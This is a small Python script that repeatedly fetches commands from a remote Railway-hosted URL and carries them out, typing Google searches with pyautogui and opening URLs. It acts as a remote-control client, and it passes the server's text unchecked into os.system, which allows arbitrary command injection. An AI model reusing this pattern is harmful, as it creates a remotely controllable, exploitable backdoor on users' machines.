import requests
import time
import pyautogui
import os

SERVER_URL = "https://haha-production-9b07.up.railway.app/command"

print("控制程序启动成功...")

while True:
    try:
        response = requests.get(SERVER_URL)
        command = response.text.strip()

        if command.startswith("search_google:"):
            keyword = command.split("search_google:",1)[1].strip()
            print("收到搜索指令:", keyword)

            os.system("start chrome")
            time.sleep(3)

            pyautogui.hotkey('ctrl', 'l')
            time.sleep(1)
            pyautogui.write("https://www.google.com")
            pyautogui.press("enter")
            time.sleep(3)

            pyautogui.write(keyword)
            pyautogui.press("enter")

        elif command.startswith("open_url:"):
            url = command.split("open_url:",1)[1].strip()
            print("收到打开网址指令:", url)
            os.system(f"start {url}")

        time.sleep(2)

    except Exception as e:
        print("错误:", e)
        time.sleep(5)

